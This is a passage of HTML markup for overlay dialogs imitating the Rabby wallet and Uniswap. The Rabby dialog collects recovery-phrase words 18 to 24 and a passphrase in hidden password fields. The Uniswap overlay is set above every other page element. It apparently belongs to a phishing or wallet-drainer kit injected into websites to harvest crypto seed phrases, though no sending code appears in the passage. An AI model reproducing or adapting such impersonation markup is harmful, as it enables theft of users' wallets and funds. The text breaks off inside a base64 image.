                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              18.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                    <div
                      id="rabby-container-21-words"
                      class="rabby-container-21-words scwtw-contents scwtw-hidden"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              19.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              20.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              21.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                    <div
                      id="rabby-container-24-words"
                      class="rabby-container-24-words scwtw-contents scwtw-hidden"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              22.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              23.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-top-[8px] scwtw-left-[8px]"
                        >
                          <div>
                            <p
                              class="font-roboto scwtw-text-[#3e495e] dark:scwtw-text-[#ffffff] scwtw-text-[13px] scwtw-font-normal"
                            >
                              24.
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-tracking-wider scwtw-text-center scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] rabby-seed-input"
                          type="password"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div
                class="scwtw-px-4 scwtw-mt-[12px] scwtw-mb-4 scwtw-opacity-0 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400"
                id="rabby-error-container"
              >
                <p
                  class="font-roboto scwtw-text-[#e34935] scwtw-font-normal scwtw-text-[13px] scwtw-leading-[18px]"
                >
                  2 inputs do not conform to Seed Phrase norms, please check.
                </p>
              </div>
              <div
                id="rabby-container-passphrase"
                class="scwtw-px-4 scwtw-mb-4 scwtw-hidden rabby-container-passphrase"
              >
                <div class="scwtw-relative">
                  <input
                    id="rabby-passphrase-input"
                    class="scwtw-w-full scwtw-tracking-wider scwtw-py-[14px] scwtw-px-[16px] scwtw-text-[15px] scwtw-font-normal scwtw-rounded-[8px] scwtw-text-[#192945] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#e0e5ec] dark:scwtw-border-[#505050] hover:scwtw-border-[#7084ff] focus:scwtw-border-[#7084ff] dark:hover:scwtw-border-[#ffffff] dark:focus:scwtw-border-[#ffffff] scwtw-bg-transparent scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-roboto data-[invalid=true]:scwtw-border-[#e34935] placeholder:scwtw-font-normal rabby-passphrase-input"
                    placeholder="Passphrase"
                    type="password"
                    data-invalid="false"
                  />
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4 scwtw-px-4"
              >
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-h-[56px] scwtw-text-[#ffffff] scwtw-bg-[#7084ff] scwtw-font-medium font-roboto scwtw-text-[17px] scwtw-cursor-pointer scwtw-rounded-[8px] scwtw-px-4 scwtw-py-3 hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 dark:disabled:scwtw-opacity-100 dark:disabled:scwtw-bg-[#1a1a1a] dark:disabled:scwtw-text-[#5b5b5b] disabled:scwtw-cursor-not-allowed"
                    id="rabby-import-button"
                  >
                    Confirm
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- //uniswap -->

    <div
      style="display: none"
      id="uniswap-modal-overlay"
      class="uniswap-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
    ></div>
    <div
      class="uniswap-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
    >
      <div
        style="display: none"
        id="uniswap-modal"
        class="uniswap-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-transform scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-full md:scwtw-top-0 md:scwtw-right-8 md:scwtw-left-auto md:scwtw-translate-x-0 md:scwtw-w-[360px] md:scwtw-h-[680px] md:scwtw-border md:scwtw-border-[#eaecef] dark:md:scwtw-border-[#ffffff1f] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2 md:scwtw-translate-y-0"
      >
        <div
          class="scwtw-h-full scwtw-w-full scwtw-bg-[#ffffff] dark:scwtw-bg-[#000000] scwtw-shadow-xl"
        >
          <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
            <div
              id="loading-container-uniswap"
              class="scwtw-absolute scwtw-inset-0 scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-flex scwtw-items-center scwtw-justify-center scwtw-flex-col scwtw-overflow-hidden scwtw-bg-cover scwtw-bg-center scwtw-bg-no-repeat scwtw-bg-left-top uniswap-bg-image scwtw-opacity-0 scwtw-hidden"
            >
              <img
                src="data:image/png;base64,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